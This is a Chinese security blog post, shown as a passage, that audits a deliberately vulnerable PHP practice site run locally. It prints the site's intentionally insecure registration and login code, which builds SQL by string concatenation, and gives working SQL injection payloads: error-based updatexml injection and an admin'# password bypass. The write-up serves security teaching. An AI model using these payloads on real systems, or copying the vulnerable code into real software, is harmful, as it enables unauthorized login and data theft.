<!DOCTYPE html>

<html theme="dark" showBanner="true" hasBanner="true" > 
<head>
  <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
  <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
  <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
  <script src="/js/color.global.min.js" ></script>
  <script src="/js/load-settings.js" ></script>
  <head>
  <meta charset="utf-8">
  
  
  

  
  <title>PHP-Code-Sec审计 | Licivo&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="环境准备在本地部署好了靶场由于是 php 原生的网站，所以路由这方面分析起来就非常的简单了，每个功能都在 modules 下对应着，照着文件路径即可 入口处 index.php1234567891011121314151617&lt;?php require_once __DIR__ . &#x27;&#x2F;core&#x2F;init.php&#x27;; ?&gt;&lt;header class&#x3D;&amp;quot">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP-Code-Sec审计">
<meta property="og:url" content="http://example.com/2026/01/15/PHP-Code-Sec/index.html">
<meta property="og:site_name" content="Licivo&#39;s Blog">
<meta property="og:description" content="环境准备在本地部署好了靶场由于是 php 原生的网站，所以路由这方面分析起来就非常的简单了，每个功能都在 modules 下对应着，照着文件路径即可 入口处 index.php1234567891011121314151617&lt;?php require_once __DIR__ . &#x27;&#x2F;core&#x2F;init.php&#x27;; ?&gt;&lt;header class&#x3D;&amp;quot">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260115094341.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260115094354.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260115102457.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260115113009.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260115160009.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260115160956.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260116094554.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260116102541.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260117142838.png">
<meta property="article:published_time" content="2026-01-15T01:42:56.597Z">
<meta property="article:modified_time" content="2026-01-21T06:25:59.329Z">
<meta property="article:author" content="Licivo">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020260115094341.png">
  
    <link rel="alternate" href="/atom.xml" title="Licivo's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/avatar.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 8.1.1"></head>

</head>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/banner1.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  
  <div id="main-grid" class="">
    <div id="nav" class="">
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/" style="display: flex; align-items: center; height: 100%; padding-left: 15px;">
      <img src="/images/avatar.png" 
           style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 2px solid var(--color-primary); box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-right: 10px;">
      <span style="font-weight: bold; font-size: 1.15rem; letter-spacing: 0.5px;">
        Licivo's Blog
      </span>
    </a>
  </nav>
  
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>

  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>

    
      <a id="nav-search-btn" class="nav-icon" title="Search" style="cursor: pointer;">
        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 0 24 24" width="24px" fill="currentColor">
    <path d="M0 0h24v24H0V0z" fill="none"/>
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
</svg>

      </a>
    

    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    

    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>

<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
    
      <a class="nav-dropdown-link" id="nav-mobile-search">Search</a>
    

    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>

<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
  // 在原有的 dropdownBtn 逻辑下方添加
let searchBtn = document.getElementById("nav-search-btn");
let searchForm = document.getElementById("search-form-wrap");
let searchClose = document.getElementById("search-close-btn");

if (searchBtn) {
  searchBtn.onclick = function() {
    searchForm.classList.remove("hidden");
    document.getElementById("search-input").focus(); // 自动聚焦输入框
  }
}

if (searchClose) {
  searchClose.onclick = function() {
    searchForm.classList.add("hidden");
  }
}

// 按下 ESC 键关闭搜索
document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') searchForm.classList.add("hidden");
});
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Licivo </div>
      <div class="dot"></div>
      <div class="subtitle">8bysnm@gmail.com </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Licivo" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                Java 反序列化
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">
                WEB安全
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                 代码审计
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">
                 云安全
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/categories/LLM%E5%AE%89%E5%85%A8/">
                LLM安全
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-PHP-Code-Sec" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        PHP-Code-Sec审计
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2026-01-15T01:42:56.597Z" itemprop="datePublished">2026-01-15</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"> 代码审计</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            18k 词 
          </div>

          
          <div class="need-seperator meta-info">
            <i class="fa-solid fa-fire-flame-curved" style="color: #ff5722; margin-right: 8px;"></i>
            <span id="busuanzi_container_page_pv" style="display: none;">
              <span id="busuanzi_value_page_pv"></span>
            </span>
          </div>
          
        </div>
        
      </header>

      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>在本地部署好了靶场<br><img src="/images/Pasted%20image%2020260115094341.png"><br><img src="/images/Pasted%20image%2020260115094354.png"><br>由于是 php 原生的网站，所以路由这方面分析起来就非常的简单了，每个功能都在 modules 下对应着，照着文件路径即可</p>
<h1 id="入口处-index-php"><a href="#入口处-index-php" class="headerlink" title="入口处 index.php"></a>入口处 index.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/core/init.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;header <span class="class"><span class="keyword">class</span>=&quot;<span class="title">nav</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">brand</span>&quot;&gt;<span class="title">PHP</span>&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">accent</span>&quot;&gt;-<span class="title">Code</span>&lt;/<span class="title">span</span>&gt;-<span class="title">Sec</span>&lt;/<span class="title">div</span>&gt;  </span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">links</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">    &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;首页&lt;/<span class="title">a</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">profile</span>.<span class="title">php</span>&quot;&gt;个人中心&lt;/<span class="title">a</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">writeup</span>.<span class="title">md</span>&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;通关教程&lt;/<span class="title">a</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">current_user</span>()): ?&gt;  //注意这里</span></span><br><span class="line"><span class="class">      &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">status</span>&quot;&gt;已登录：&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">h</span>(<span class="title">current_user</span>()[&#x27;<span class="title">username</span>&#x27;]); ?&gt;&lt;/<span class="title">span</span>&gt;  </span></span><br><span class="line"><span class="class">      &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span>&quot; <span class="title">href</span>=&quot;/<span class="title">logout</span>.<span class="title">php</span>&quot;&gt;退出&lt;/<span class="title">a</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;  </span></span><br><span class="line"><span class="class">      &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span>&quot; <span class="title">href</span>=&quot;/<span class="title">login</span>.<span class="title">php</span>&quot;&gt;登录&lt;/<span class="title">a</span>&gt;  </span></span><br><span class="line"><span class="class">      &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span>&quot; <span class="title">href</span>=&quot;/<span class="title">register</span>.<span class="title">php</span>&quot;&gt;注册&lt;/<span class="title">a</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;  </span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;  </span></span><br><span class="line"><span class="class">&lt;/<span class="title">header</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在 <code>&lt;?php if (current_user()): ?&gt;</code> 似乎做了鉴权 然后去<br><code>&lt;?php echo h(current_user()[&#39;username&#39;]); ?&gt;</code> 输出 current_user()的 username<br>跟进current_user() 来到了init.php。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">current_user</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;  </span><br><span class="line">        <span class="keyword">return</span> [  </span><br><span class="line">            <span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>],  </span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;unknown&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;is_admin&#x27;</span> =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] ?? <span class="number">0</span>,  </span><br><span class="line">        ];  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="注册处register-php-SQL-注入-1"><a href="#注册处register-php-SQL-注入-1" class="headerlink" title="注册处register.php SQL 注入 1"></a>注册处register.php SQL 注入 1</h1><p>再来到注册入口</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/core/init.php&#x27;</span>; <span class="meta">?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="variable">$e</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="variable">$pdo</span> = <span class="title function_ invoke__">db</span>();  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pdo</span>) &#123;  </span><br><span class="line">        <span class="comment">// 演示：弱加密 MD5、无复杂校验、可被SQL注入  </span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users(username, password, email, is_admin) VALUES(&#x27;&quot;</span>.<span class="variable">$u</span>.<span class="string">&quot;&#x27;, MD5(&#x27;&quot;</span>.<span class="variable">$p</span>.<span class="string">&quot;&#x27;), &#x27;&quot;</span>.<span class="variable">$e</span>.<span class="string">&quot;&#x27;, 0)&quot;</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);  </span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;注册成功，&lt;a href=&quot;/login.php&quot;&gt;去登录&lt;/a&gt;&#x27;</span>;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;错误：&#x27;</span>.<span class="title function_ invoke__">h</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()).<span class="string">&#x27;&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;数据库未连接，请先安装&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为存在 <code>$msg = &#39;&lt;span class=&quot;danger&quot;&gt;错误：&#39;.h($e-&gt;getMessage()).&#39;&lt;/span&gt;&#39;;</code> 所以可以尝试去报错注入，自己构造字段然后将后面的内容全部注释掉<br>payload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>test1<span class="string">&#x27; , (updatexml(1,concat(0x7e,user(),0x7e),1)),&#x27;</span><span class="number">123</span><span class="variable">@qq</span>.com<span class="string">&#x27;,0)--+&amp;password=123&amp;email=123%401233.com</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/Pasted%20image%2020260115102457.png"></p>
<h1 id="登录接口-login-php-逻辑缺陷漏洞-1-SQL注入-2"><a href="#登录接口-login-php-逻辑缺陷漏洞-1-SQL注入-2" class="headerlink" title="登录接口 login.php 逻辑缺陷漏洞 1&amp;SQL注入 2"></a>登录接口 login.php 逻辑缺陷漏洞 1&amp;SQL注入 2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/core/init.php&#x27;</span>; <span class="meta">?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 演示：易受SQL注入影响（拼接查询语句），弱加密MD5  </span></span><br><span class="line">    <span class="variable">$pdo</span> = <span class="title function_ invoke__">db</span>();  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pdo</span>) &#123;  </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;&quot;</span>.<span class="variable">$u</span>.<span class="string">&quot;&#x27; AND password=MD5(&#x27;&quot;</span>.<span class="variable">$p</span>.<span class="string">&quot;&#x27;) LIMIT 1&quot;</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">fetch</span>();  </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;  </span><br><span class="line">                <span class="comment">// 故意不调用 session_regenerate_id(true) 演示会话固定  </span></span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];  </span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  </span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;is_admin&#x27;</span>];  </span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /&#x27;</span>);  </span><br><span class="line">                <span class="keyword">exit</span>;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;登录失败&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;错误：&#x27;</span>.<span class="title function_ invoke__">h</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()).<span class="string">&#x27;&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;数据库未连接，请先安装&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$sql = &quot;SELECT * FROM users WHERE username=&#39;&quot;.$u.&quot;&#39; AND password=MD5(&#39;&quot;.$p.&quot;&#39;) LIMIT 1&quot;; </code><br>因为 sql 语句是字符串拼接起来的，所以将密码注释掉可以直接登录<br>payload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>

<p>同时也是存在报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admi<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="string">&#x27;) or updatexml(1,concat(0x7e,user(),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
